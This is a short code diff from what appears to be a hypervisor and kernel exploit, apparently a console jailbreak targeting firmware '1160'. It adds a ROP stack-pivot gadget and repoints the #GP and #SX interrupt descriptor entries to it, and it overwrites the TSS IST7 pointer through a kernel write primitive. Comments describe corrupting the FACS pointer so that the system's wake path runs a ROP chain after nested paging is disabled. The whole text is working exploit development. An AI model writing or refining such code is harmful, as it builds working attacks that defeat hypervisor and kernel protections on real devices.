@@ -100,6 +100,7 @@ static int offsets_present(void) {
       env_offset.HV_MP_STARTUP_CALL,
       env_offset.MP_STARTUP_INIT_VECTOR,
       env_offset.RESUME_DATA_CAVE,
+      env_offset.GAD_ADD_RSP_28_POP_RBP_RET,
       env_offset.GAD_PIVOT_ADD_RSP28_RET,
       env_offset.GAD_IRETQ,
       env_offset.GAD_POP_RAX_RET,
@@ -595,8 +596,12 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
 
   checkpoint_1160_hv("final IST7/IDT/FACS mutations begin");
   kwrite64(kg(env_offset.COMMON_TSS) + TSS_IST(7), sx_ist + 0x1000);
-  setidt(13, kg(env_offset.GAD_PIVOT_ADD_RSP28_RET), 7);
-  setidt(30, kg(env_offset.GAD_PIVOT_ADD_RSP28_RET), 7);
+  /* #GP and #SX have a six-qword IST frame.  Match Sonic's distinct final
+   * pivot: add rsp,0x28 plus pop rbp advances all 0x30 bytes before ret enters
+   * the ROP chain.  The no-pop pivot above remains exclusive to the
+   * error-code-free #DB startup carrier. */
+  setidt(13, kg(env_offset.GAD_ADD_RSP_28_POP_RBP_RET), 7);
+  setidt(30, kg(env_offset.GAD_ADD_RSP_28_POP_RBP_RET), 7);
 
   /* Matches Sonic: corrupt the FACS pointer so the stock wake path reaches
    * the #GP/#SX copy-and-transfer chain after NPT has been disabled. */
